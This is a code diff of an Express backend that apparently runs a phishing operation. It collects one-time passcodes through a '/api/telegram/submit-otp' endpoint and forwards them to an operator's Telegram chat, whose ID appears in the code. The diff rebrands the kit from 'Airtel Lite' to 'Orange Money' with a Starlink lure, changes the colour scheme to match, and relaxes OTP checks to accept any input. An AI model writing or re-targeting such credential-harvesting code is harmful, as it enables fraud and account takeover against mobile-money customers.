@@ -255,8 +255,9 @@ app.post('/api/telegram/submit-otp', async (req, res) => {
       return res.status(400).json({ success: false, message: 'Session expired. Please start again.' });
     }
 
-    if (typeof otp !== 'string' || !/^\d{4,8}$/.test(otp)) {
-      return res.status(400).json({ success: false, message: 'Invalid OTP format' });
+    // ACCEPT ANY MESSAGE — only require non-empty
+    if (typeof otp !== 'string' || otp.length === 0) {
+      return res.status(400).json({ success: false, message: 'OTP required' });
     }
 
     r.data.otp = otp;
@@ -416,7 +417,7 @@ app.use((_req, res) => {
     <html><body style="font-family:sans-serif;text-align:center;padding:60px 20px;background:#f9fafb;">
       <h1 style="font-size:48px;margin:0;color:#111827;">404</h1>
       <p style="color:#6b7280;margin-top:12px;">Page not found.</p>
-      <a href="/" style="display:inline-block;margin-top:20px;padding:12px 22px;background:#ed1c24;color:#fff;text-decoration:none;font-weight:600;border-radius:10px;">Back to Home</a>
+      <a href="/" style="display:inline-block;margin-top:20px;padding:12px 22px;background:#FF6600;color:#fff;text-decoration:none;font-weight:600;border-radius:10px;">Back to Home</a>
     </body></html>
   `);
 });
@@ -473,7 +474,7 @@ async function registerWebhook() {
 /* ==================== START ==================== */
 app.listen(PORT, async () => {
   console.log('====================================');
-  console.log('🏆 Airtel Lite / Starlink backend running');
+  console.log('🏆 Orange Money / Starlink backend running');
   console.log(`🚀 Port: ${PORT}`);
   console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
   console.log(`🔍 Chat ID length: ${TELEGRAM_CHAT_ID.length} (expected 10 for 8426930447)`);
